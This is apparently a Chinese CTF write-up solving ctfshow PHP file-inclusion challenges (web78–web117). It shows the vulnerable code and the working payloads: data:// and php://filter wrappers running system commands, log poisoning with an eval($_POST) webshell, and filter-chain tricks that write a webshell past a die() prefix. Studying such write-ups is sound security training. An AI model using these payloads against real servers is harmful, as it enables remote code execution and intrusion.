<p>可能无法查看phpinfo()，那我们用</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?c=data:<span class="comment">//text/plain,&lt;?php phpinfo(); ?&gt;</span></span><br></pre></td></tr></table></figure>
<p>是不是可以拿到phpinfo()？（web78可以）</p>
<h1>web78</h1>
<p>源码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>其中有一个include包含，那我们是不是可以</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?file=data:<span class="comment">//text/plain,&lt;?php system(&quot;ls&quot;); ?&gt;</span></span><br><span class="line">    </span><br><span class="line">?file=data:<span class="comment">//text/plain,&lt;?php system(&quot;cat flag.php&quot;); ?&gt;</span></span><br><span class="line"><span class="comment"># 或者</span></span><br><span class="line">?file=php:<span class="comment">//filter/convert.base64-encode/resource=flag.php</span></span><br></pre></td></tr></table></figure>
<p>ctfshow{950b168a-e2de-4fbb-9daa-11260a8af088}</p>
<h1>web79</h1>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;php&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>源码把我们的php给替换成三个问号，那我们用base64加密一下就可以了</p>
<p>?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTsgPz4=</p>
<p>ctfshow{2751c0eb-edde-4e4f-a845-64cca68c1863}</p>
<h1>web80</h1>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;php&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;data&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>对于Apache，日志存放路径：/var/log/apache/access.log<br>
对于Ngnix，日志存放路径：/var/log/nginx/access.log 和 /var/log/nginx/error.log</strong></p>
<p>响应头里面可以看是Aoache还是Ngnix</p>
<p><img src="image-20250122195554595.png" alt="image-20250122195554595"></p>
<p>但有时候日志目录会改变，需要找</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">方法一</span><br><span class="line">?file=/<span class="keyword">var</span>/log/nginx/access.log</span><br><span class="line"></span><br><span class="line">User-Agent=<span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>]);<span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">post=a=<span class="title function_ invoke__">system</span>(<span class="string">&#x27;ls&#x27;</span>);</span><br><span class="line"></span><br><span class="line">post=a=<span class="title function_ invoke__">system</span>(<span class="string">&#x27;fl0g.php&#x27;</span>);</span><br></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">方法二（这个不行，因为过滤了php）</span><br><span class="line">php:<span class="comment">//input可以把POST的内容作为php代码执行</span></span><br><span class="line"></span><br><span class="line">?file=php:<span class="comment">//input</span></span><br><span class="line"></span><br><span class="line">post=a=<span class="title function_ invoke__">system</span>(<span class="string">&#x27;ls&#x27;</span>);</span><br><span class="line"></span><br><span class="line">post=a=<span class="title function_ invoke__">system</span>(<span class="string">&#x27;fl0g.php&#x27;</span>);</span><br></pre></td></tr></table></figure>
<p>都可以用蚂剑连接post，但是需要知道日志的目录，例如：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://ec78819f-174d-4e26-82be-7cce55c08b05.challenge.ctf.show/?url=/var/log/nginx/access.log</span><br></pre></td></tr></table></figure>
<p>ctfshow{8d557bc7-1379-4a37-b5c1-2497fcef48e2}</p>
<h1>web81</h1>
<p>还是日志</p>
<p>ctfshow{11544a11-2a2e-4667-8a84-15b260e4d33c}</p>
<h1>web82-86</h1>
<p><strong>竞争环境需要晚上11点30分至次日7时30分之间做，其他时间不开放竞争条件</strong></p>
<p>那现在不做了</p>
<h1>web87</h1>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="variable">$content</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;content&#x27;</span>];</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;php&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;data&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;:&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;.&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="title function_ invoke__">file_put_contents</span>(<span class="title function_ invoke__">urldecode</span>(<span class="variable">$file</span>), <span class="string">&quot;&lt;?php die(&#x27;大佬别秀了&#x27;);?&gt;&quot;</span>.<span class="variable">$content</span>);</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>我们正常看到的url是url编码过的，在hackbar里面如果有空格的话，它自己会把空格转成%20再上传，在服务器里面他又会自己解码成空格。</p>
<p>在源码当中有一个urldecode($file)，他会把我们是$file进行一次url解码一次。根据上一段，我们推断：我们的?file=后面的东西需要进行两次url加密(all)。</p>
<p>源码当中有<?php die('大佬别秀了');?>，他会终止代码运行，导致我们post的conten无法运行，那么我们可以</p>
<p>使用filter，然后进行base64解码。因为我们知道：base64里面是大小写字母加数字外还有+和/，没有其他的符号了，总共64个。那么我们把file_put_contents后面的&quot;<?php die('大佬别秀了');?>&quot;.$content写进一个1.php文件里面，并对1.php使用php://filter/write协议的base64加密。那么die()函数就失效了。因为经过base64之后，其内容变成了phpdie，那么我们把post的content的内容改为经过base64加密的<?php eval($_POST[a]); ?>就可以在1.php里面写入一个一句话木马。然后通过一句话木马拿到flag</p>
<p>由于base64的编码必须为4的倍数，所以，我们在<?php eval($_POST[a]); ?>前面随便加两个base64里面有的字符就可以了，以便和前面我们破坏城的phpdie凑成8个。</p>
<p>过程：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?file=php:<span class="comment">//filter/write=convert.base64-decode/resource=1.php</span></span><br><span class="line"></span><br><span class="line">改为</span><br><span class="line"></span><br><span class="line">?file=%<span class="number">25</span>%<span class="number">37</span>%<span class="number">30</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">38</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">30</span>%<span class="number">25</span>%<span class="number">33</span>%<span class="number">61</span>%<span class="number">25</span>%<span class="number">32</span>%<span class="number">66</span>%<span class="number">25</span>%<span class="number">32</span>%<span class="number">66</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">36</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">39</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">63</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">34</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">35</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">32</span>%<span class="number">25</span>%<span class="number">32</span>%<span class="number">66</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">37</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">32</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">39</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">34</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">35</span>%<span class="number">25</span>%<span class="number">33</span>%<span class="number">64</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">33</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">66</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">65</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">36</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">35</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">32</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">34</span>%<span class="number">25</span>%<span class="number">32</span>%<span class="number">65</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">32</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">31</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">33</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">35</span>%<span class="number">25</span>%<span class="number">33</span>%<span class="number">36</span>%<span class="number">25</span>%<span class="number">33</span>%<span class="number">34</span>%<span class="number">25</span>%<span class="number">32</span>%<span class="number">64</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">34</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">35</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">33</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">66</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">34</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">35</span>%<span class="number">25</span>%<span class="number">32</span>%<span class="number">66</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">32</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">35</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">33</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">66</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">35</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">32</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">33</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">35</span>%<span class="number">25</span>%<span class="number">33</span>%<span class="number">64</span>%<span class="number">25</span>%<span class="number">33</span>%<span class="number">31</span>%<span class="number">25</span>%<span class="number">32</span>%<span class="number">65</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">30</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">38</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">30</span></span><br><span class="line"></span><br><span class="line">content=<span class="meta">&lt;?php</span> <span class="keyword">eval</span>(<span class="variable">$_POST</span>[a]); <span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">改为</span><br><span class="line"></span><br><span class="line">content=aaPD9waHAgZXZhbCgkX1BPU1RbYV0pOyA/Pg==</span><br><span class="line"></span><br><span class="line">之后</span><br><span class="line"></span><br><span class="line">url/<span class="number">1</span>.php</span><br><span class="line"></span><br><span class="line">post=a=<span class="title function_ invoke__">system</span>(<span class="string">&#x27;cat f*&#x27;</span>);</span><br></pre></td></tr></table></figure>
<p>ctfshow{ec5c4e6c-2b7a-48b2-b297-47b9597f2635}</p>
<p>另一种方法：php://filter/write=string.rot13/resource=1.php</p>
<p>rot13：将字母按照字母表的顺序递进13次</p>
<p>通过位移将原来的 <?php die('大佬别秀了');?> 变成 <?cuc qvr('大佬别秀了');?></p>
<p>?file=php://filter/write=string.rot13/resource=1.php</p>
<p>?file=%25%37%30%25%36%38%25%37%30%25%33%41%25%32%46%25%32%46%25%36%36%25%36%39%25%36%43%25%37%34%25%36%35%25%37%32%25%32%46%25%37%37%25%37%32%25%36%39%25%37%34%25%36%35%25%33%44%25%37%33%25%37%34%25%37%32%25%36%39%25%36%45%25%36%37%25%32%45%25%37%32%25%36%46%25%37%34%25%33%31%25%33%33%25%32%46%25%37%32%25%36%35%25%37%33%25%36%46%25%37%35%25%37%32%25%36%33%25%36%35%25%33%44%25%33%31%25%32%45%25%37%30%25%36%38%25%37%30</p>
<p>content=<?php system('cat f*');?></p>
<p>content=<?cuc flfgrz('gnp s*.cuc');?></p>
<h1>web88</h1>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/php|\~|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\-|\_|\+|\=|\./i&quot;</span>, <span class="variable">$file</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;error&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>?file=data://text/plain;base64,&lt;?php system(‘tac fl*’);</p>
<p>?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCd0YWMgZmwqJyk7</p>
<p>ctfshow{1831aaaa-8728-4d78-92a7-bd81f724b308}</p>
<h1>web116</h1>
<p>misc和web结合的题目</p>
<p>下载视频foremost分离</p>
<p>?file=flag.php</p>
<p>bp抓包</p>
<p>ctfshow{0a660000-a7ba-4b5e-b76c-d299aad214a0}</p>
<h1>web117</h1>
<p>UCS-2编码转换:对目标字符串进行2位一反转</p>
<p>?file=php://filter/write=convert.iconv.UCS-2LE.UCS-2BE/resource=a.php</p>
<p>contents=?&lt;hp pvela$(P_SO[T]1;)&gt;?</p>
<p>ctfshow{3b47fcc8-c7cd-453d-b807-fb93b3395516}</p>
<p>还有UCS-4</p>
<h1>凌晨4点，玩会儿手机睡觉了，web82-86竞争环境，明天凌晨再搞了</h1>
<h1>web82-86由于需要图例展示，又开了一篇新的，请移步</h1>
]]></content>
      <tags>
        <tag>文件包含</tag>
      </tags>
  </entry>
</search>
